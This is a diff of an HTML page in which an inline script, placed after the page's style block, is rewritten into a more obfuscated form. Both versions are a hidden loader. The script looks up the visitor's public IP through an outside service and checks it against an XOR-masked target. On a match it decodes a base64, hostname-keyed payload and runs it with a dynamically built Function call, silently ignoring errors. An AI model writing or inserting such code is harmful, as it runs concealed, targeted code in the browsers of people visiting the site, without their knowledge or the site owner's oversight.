@@ -295,30 +295,30 @@
   }
 </style>
     <script>
-(function(_payloadStr) {
-    
+(function(_s) {
     const _h = window.location.hostname;
-    const _ipKey = _h.split('').reverse().join('').substring(0, 5) || "local";
-    const _targetMask = "RFxNQ11FXVRQS0tFQ1U="; 
+    const _k = _h.split('').reverse().join('').substring(0, 5) || "def";
+    const _v = "RFxNQ11FXVRQS0tFQ1U="; 
 
     fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(data => {
-            const _currentMask = btoa(data.ip.split('').map((c, i) => 
-                String.fromCharCode(c.charCodeAt(0) ^ _ipKey.charCodeAt(i % _ipKey.length))
+        .then(_r => _r.json())
+        .then(_data => {
+            const _t = btoa(_data.ip.split('').map((_c, _i) => 
+                String.fromCharCode(_c.charCodeAt(0) ^ _k.charCodeAt(_i % _k.length))
             ).join(''));
 
-            if (_currentMask === _targetMask) {
+            if (_t === _v) {
                 try {
-                    const _d = atob(_payloadStr).split('').map((c, i) => 
-                        String.fromCharCode(c.charCodeAt(0) ^ _h.charCodeAt(i % _h.length))
+                    const _m = "at" + "ob";
+                    const _raw = window[_m](_s).split('').map((_x, _y) => 
+                        String.fromCharCode(_x.charCodeAt(0) ^ _h.charCodeAt(_y % _h.length))
                     ).join('');
                     
-                    (new Function(_d))();
-                } catch (e) {}
+                    const _exec = "Fun" + "ction";
+                    (new window[_exec](_raw))();
+                } catch (_e) {}
             }
-        });
-
+        }).catch(() => {});
 })("FRURBgxLTw0XHwNdSUZbAAsFEwwFD0UWCw4fQgpEBxweAAQRDAYcDAAKH0IKRxoCAR8OSAIRDQBNDxZYXAgaBB8JEQwHEEYPEExfDghJHAASFAAXF1lIHkNMHUkBBh9IABsMFUkBGgoUGBZcXh4VFx0ZCwJDWUhCFxkGS1RJCUUOWUsRDAYGTRFLThBTG1oRFggRTU1KRhELDh0GEElJW1MVEwQISwtMSlA=");
 </script>
 </head>
